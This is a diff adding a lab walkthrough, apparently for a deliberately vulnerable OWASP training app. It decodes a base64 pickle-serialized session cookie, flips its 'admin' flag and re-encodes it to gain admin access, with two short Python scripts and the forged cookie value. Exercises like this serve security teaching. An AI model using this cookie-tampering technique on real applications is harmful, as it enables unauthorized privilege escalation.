@@ -521,7 +521,40 @@ add a post which includes this content
 The result would look like this -->
 ![Screenshot from 2022-06-10 21-04-29](https://user-images.githubusercontent.com/75058161/173106213-9e218e81-d4b2-4447-9570-4aa8de3dea88.png)
 
-### 2021-A8: Software and Data Integrity failure
+### 2021-A8: Software and Data Integrity failure Lab1
+In this challenge, the task was to access a page as an admin and determine how the role was defined. The page had a cookie named `token` which was base64 encoded. Decoding the cookie revealed that it was pickle serialized and contained various attributes. The hint provided suggested trying to change the `admin` attribute to make the page readable.
+
+To decode the cookie, the following script was provided:
+```
+import base64
+
+encoded_data = 'gASVNAAAAAAAAACMEmludHJvZHVjdGlvbi52aWV3c5SMCFRlc3RVc2VylJOUKYGUfZSMBWFkbWlulEsAc2Iu'
+binary_data = base64.b64decode(encoded_data)
+
+print(binary_data)
+```
+This script decoded the cookie to the binary data 
+
+`b'\x80\x04\x954\x00\x00\x00\x00\x00\x00\x00\x8c\x12introduction.views\x94\x8c\x08TestUser\x94\x93\x94)\x81\x94}\x94\x8c\x05admin\x94K\x00sb.'`
+
+To make ourselves an admin, we need to change the value of `admin` to `1`. The modified binary data will be `b'\x80\x04\x954\x00\x00\x00\x00\x00\x00\x00\x8c\x12introduction.views\x94\x8c\x08TestUser\x94\x93\x94)\x81\x94}\x94\x8c\x05admin\x94K\x01sb.'`
+
+To encode this modified binary data to base64 and replace the original cookie with the new one, the following script can be used:
+
+```
+import base64
+
+binary_data = b'\x80\x04\x954\x00\x00\x00\x00\x00\x00\x00\x8c\x12introduction.views\x94\x8c\x08TestUser\x94\x93\x94)\x81\x94}\x94\x8c\x05admin\x94K\x01sb.'
+encoded_data = base64.b64encode(binary_data)
+
+print(encoded_data.decode('utf-8'))
+```
+
+This script encodes the binary data to base64 and prints the new cookie `gASVNAAAAAAAAACMEmludHJvZHVjdGlvbi52aWV3c5SMCFRlc3RVc2VylJOUKYGUfZSMBWFkbWlulEsBc2Iu`
+
+Replace the original cookie with the new one, and refresh the page. Now you have the `admin` role and can read the contents of the page.
+
+### 2021-A8: Software and Data Integrity failure Lab2
 This data is a demonstration that how an XSS attack can deceive users to download any malicious file. The lab consists of a page to download a file, and a direct link to that page is also given (from a hacker). Let's download both files and compare the hash before opening that.
 ![image](https://user-images.githubusercontent.com/75058161/190912308-1d26fb2e-2c6c-4c67-bf2a-9bb0f4abbfd0.png)
 So as we can see the hashes don't match. So as a user we should always cross-check signatures for verification of Data Integrity. 
